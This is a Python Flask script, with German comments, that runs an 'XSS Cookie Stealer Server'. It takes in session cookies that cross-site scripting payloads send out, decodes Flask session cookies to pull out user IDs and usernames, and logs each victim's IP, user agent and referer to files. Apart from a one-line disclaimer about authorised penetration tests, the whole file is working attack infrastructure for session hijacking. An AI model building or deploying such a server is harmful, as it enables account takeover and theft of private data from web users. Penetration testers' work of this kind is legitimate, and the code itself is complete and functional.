#!/usr/bin/env python3
"""
XSS Cookie Stealer Server
Empfängt und loggt gestohlene Session-Cookies von XSS-Payloads

WICHTIG: Nur für autorisierte Penetrationstests verwenden!
"""

import json
import os
import base64
from datetime import datetime
from pathlib import Path
from flask import Flask, request, Response
from urllib.parse import unquote

class CookieStealerServer:
    def __init__(self, config_path="config.json"):
        self.config = self.load_config(config_path)
        self.app = Flask(__name__)
        self.stolen_cookies = []
        self.setup_routes()

    def load_config(self, config_path):
        """Lädt Konfiguration aus JSON-Datei"""
        config_file = Path(__file__).parent / config_path
        with open(config_file, 'r', encoding='utf-8') as f:
            return json.load(f)

    def setup_routes(self):
        """Richtet Flask-Routes ein"""

        @self.app.route('/steal', methods=['GET', 'POST', 'OPTIONS'])
        def steal_cookie():
            """Empfängt gestohlene Cookies via GET oder POST"""
            # Handle CORS Preflight
            if request.method == 'OPTIONS':
                response = self.create_tracking_pixel_response()
                response.headers['Access-Control-Allow-Origin'] = '*'
                response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
                response.headers['Access-Control-Allow-Headers'] = '*'
                return response

            # Extract cookie from query param or POST body
            cookie = None
            if request.method == 'GET':
                cookie = request.args.get('c')
            else:
                cookie = request.form.get('c') or request.json.get('c') if request.json else None

            if cookie:
                # URL-decode cookie
                cookie = unquote(cookie)

                # Parse Flask session cookie
                parsed_session = self.parse_flask_session(cookie)

                cookie_data = {
                    "timestamp": datetime.now().isoformat(),
                    "cookie": cookie,
                    "parsed_session": parsed_session,
                    "ip": request.remote_addr,
                    "user_agent": request.headers.get('User-Agent'),
                    "referer": request.headers.get('Referer'),
                    "method": request.method
                }

                self.stolen_cookies.append(cookie_data)
                self.log_cookie(cookie_data)
                self.save_cookies()

                # Console-Ausgabe
                print(f"\n{'='*80}")
                print(f"[+] COOKIE GESTOHLEN!")
                print(f"{'='*80}")
                print(f"Zeitstempel: {cookie_data['timestamp']}")
                print(f"IP-Adresse:  {cookie_data['ip']}")
                print(f"Cookie:      {cookie[:100]}{'...' if len(cookie) > 100 else ''}")
                if parsed_session.get('success'):
                    print(f"\n[*] Flask Session dekodiert:")
                    print(f"    User ID:   {parsed_session.get('user_id', 'N/A')}")
                    print(f"    Username:  {parsed_session.get('username', 'N/A')}")
                print(f"{'='*80}\n")

            # Return 1x1 transparent GIF
            return self.create_tracking_pixel_response()

        @self.app.route('/status')
        def status():
            """Status-Endpoint zum Überprüfen des Servers"""
            return {
                "status": "running",
                "stolen_cookies": len(self.stolen_cookies),
                "server": "XSS Cookie Stealer"
            }

    def parse_flask_session(self, cookie_string):
        """
        Versucht Flask Session Cookie zu dekodieren
        Flask Sessions sind base64-encoded JSON mit Signatur
        """
        try:
            # Extract session cookie value
            if 'session=' in cookie_string:
                session_value = cookie_string.split('session=')[1].split(';')[0]
            else:
                return {"success": False, "error": "No session cookie found"}

            # Split signature (format: data.signature)
            parts = session_value.split('.')
            if len(parts) < 2:
                return {"success": False, "error": "Invalid session format"}

            session_data = parts[0]

            # Add base64 padding if needed
            padding = 4 - (len(session_data) % 4)
            if padding != 4:
                session_data += '=' * padding

            # Decode base64
            try:
                decoded = base64.urlsafe_b64decode(session_data)
                decoded_str = decoded.decode('utf-8')

                # Try to parse as JSON
                try:
                    session_obj = json.loads(decoded_str)

                    # Extract user info if present
                    user_info = session_obj.get('user', {})

                    return {
                        "success": True,
                        "raw": decoded_str,
                        "user_id": user_info.get('id'),
                        "username": user_info.get('username'),
                        "full_session": session_obj
                    }
                except json.JSONDecodeError:
                    return {
                        "success": True,
                        "raw": decoded_str,
                        "parsed": False
                    }

            except Exception as e:
                return {"success": False, "error": f"Base64 decode error: {str(e)}"}

        except Exception as e:
            return {"success": False, "error": str(e)}

    def log_cookie(self, cookie_data):
        """Schreibt Cookie in TXT-Log-Datei"""
        log_file = Path(__file__).parent / self.config['stealer_server']['log_file']
        log_file.parent.mkdir(parents=True, exist_ok=True)

        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"Timestamp:   {cookie_data['timestamp']}\n")
            f.write(f"IP:          {cookie_data['ip']}\n")
            f.write(f"User-Agent:  {cookie_data['user_agent']}\n")
            f.write(f"Referer:     {cookie_data['referer']}\n")
            f.write(f"Method:      {cookie_data['method']}\n")
            f.write(f"Cookie:      {cookie_data['cookie']}\n")

            if cookie_data['parsed_session'].get('success'):
                f.write(f"\nFlask Session:\n")
                f.write(f"  User ID:   {cookie_data['parsed_session'].get('user_id', 'N/A')}\n")
                f.write(f"  Username:  {cookie_data['parsed_session'].get('username', 'N/A')}\n")

            f.write(f"{'='*80}\n")

    def save_cookies(self):
        """Speichert alle gestohlenen Cookies in JSON-Datei"""
        output_file = Path(__file__).parent / self.config['stealer_server']['cookie_output']
        output_file.parent.mkdir(parents=True, exist_ok=True)

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                "metadata": {
                    "server": "CookieStealerServer",
                    "timestamp": datetime.now().isoformat(),
                    "version": "1.0"
                },
                "stolen_cookies": self.stolen_cookies,
                "statistics": {
                    "total_stolen": len(self.stolen_cookies),
                    "unique_ips": len(set(c['ip'] for c in self.stolen_cookies))
                }
            }, f, indent=2, ensure_ascii=False)

    def create_tracking_pixel_response(self):
        """Erstellt 1x1 transparentes GIF als Response"""
        # 1x1 transparent GIF (43 bytes)
        gif_data = (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00'
            b'\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02'
            b'\x44\x01\x00\x3b'
        )

        response = Response(gif_data, mimetype='image/gif')
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        return response

    def run(self):
        """Startet den Cookie-Stealer Server"""
        host = self.config['stealer_server']['host']
        port = self.config['stealer_server']['port']

        print("\n" + "="*80)
        print("XSS COOKIE STEALER SERVER")
        print("="*80)
        print(f"Server gestartet auf: http://{host}:{port}/steal")
        print(f"Status-Endpoint:      http://{host}:{port}/status")
        print(f"\nWICHTIG: Nur für autorisierte Penetrationstests verwenden!")
        print(f"\nWarte auf gestohlene Cookies...")
        print("="*80 + "\n")

        # Threaded=True für bessere Fehlerbehandlung
        self.app.run(host=host, port=port, debug=False, threaded=True)


if __name__ == "__main__":
    try:
        server = CookieStealerServer()
        server.run()
    except KeyboardInterrupt:
        print("\n\n[*] Server beendet.")
    except Exception as e:
        print(f"\n[!] Fehler: {e}")
        print("[*] Stelle sicher, dass config.json vorhanden ist und Port 8888 verfügbar ist.")
